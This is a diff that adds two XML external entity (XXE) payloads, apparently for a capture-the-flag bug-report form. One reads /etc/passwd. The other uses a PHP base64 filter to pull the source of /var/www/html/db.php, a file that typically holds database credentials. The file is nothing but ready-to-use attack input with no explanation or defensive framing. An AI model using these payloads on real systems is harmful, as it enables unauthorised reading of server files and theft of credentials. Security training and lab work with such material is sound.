@@ -1,0 +1,19 @@
+<!-- For /etc/passwd content -->
+<?xml  version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE reward [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+		<bugreport>
+		<title></title>
+		<cwe></cwe>
+		<cvss></cvss>
+		<reward>&xxe;</reward>
+		</bugreport>
+
+<!-- For db.php content -->
+<?xml  version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE reward [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/db.php">]>
+		<bugreport>
+		<title></title>
+		<cwe></cwe>
+		<cvss></cvss>
+		<reward>&xxe;</reward>
+		</bugreport>
